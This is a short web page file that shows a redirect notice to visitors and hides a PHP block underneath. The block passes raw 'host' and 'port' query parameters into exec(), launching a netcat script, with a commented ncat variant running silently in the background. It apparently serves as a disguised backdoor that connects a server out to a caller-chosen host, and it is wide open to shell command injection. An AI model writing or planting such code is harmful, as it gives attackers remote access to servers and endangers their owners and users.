<head>
<meta http-equiv="refresh" content="0; url=/" />
</head>
request sent
<a href="/">redirect</a>

<?php
  #exec('bash/ncat '.$_GET['host'].' '.$_GET['port'].' >/dev/null 2>&1 &');
  exec("run_nc.sh ".$_GET['host']." ".$_GET['port']);
?>
